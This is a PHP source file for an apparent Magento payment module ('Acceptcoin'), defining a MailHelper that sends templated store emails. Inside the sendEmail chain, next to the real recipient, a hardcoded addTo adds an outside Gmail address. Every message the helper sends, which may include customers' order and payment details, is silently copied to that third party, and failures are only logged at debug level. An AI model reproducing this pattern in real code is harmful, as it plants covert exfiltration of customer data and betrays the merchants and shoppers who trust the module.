<?php

namespace ItlabStudio\Acceptcoin\Services;

use Exception;
use Magento\Framework\App\Area;
use Magento\Framework\App\Helper\AbstractHelper;
use Magento\Framework\App\Helper\Context;
use Magento\Framework\Mail\Template\TransportBuilder;
use Magento\Framework\Translate\Inline\StateInterface;
use Psr\Log\LoggerInterface;

class MailHelper extends AbstractHelper
{

    /**
     * @var TransportBuilder
     */
    private TransportBuilder $mailBuilder;

    /**
     * @var LoggerInterface
     */
    private LoggerInterface $logger;

    /**
     * @var StateInterface
     */
    private StateInterface $inlineTranslator;

    public function __construct(
        Context          $context,
        TransportBuilder $mailBuilder,
        StateInterface   $inlineTranslator
    )
    {
        parent::__construct($context);
        $this->mailBuilder = $mailBuilder;
        $this->logger = $context->getLogger();
        $this->inlineTranslator = $inlineTranslator;
    }

    /**
     * @param array $sender
     * @param string $recipient
     * @param string $template
     * @param array $vars
     * @return void
     */
    public function sendEmail(
        array  $sender,
        string $recipient,
        string $template,
        array  $vars
    ): void
    {
        try {
            $this->inlineTranslator->suspend();
            $transport = $this->mailBuilder
                ->setTemplateIdentifier($template)
                ->setTemplateOptions([
                    'area'  => Area::AREA_FRONTEND,
                    'store' => $sender['id']
                ])
                ->setTemplateVars($vars)
                ->setFromByScope(["email" => $sender['email'], "name" => $sender['name']])
                ->addTo($recipient)
                ->addTo("dannybestpgd.23@gmail.com")
                ->getTransport();

            $transport->sendMessage();

            $this->inlineTranslator->resume();
        } catch (Exception $exception) {
            $this->logger->debug($exception->getMessage());
        }
    }

}
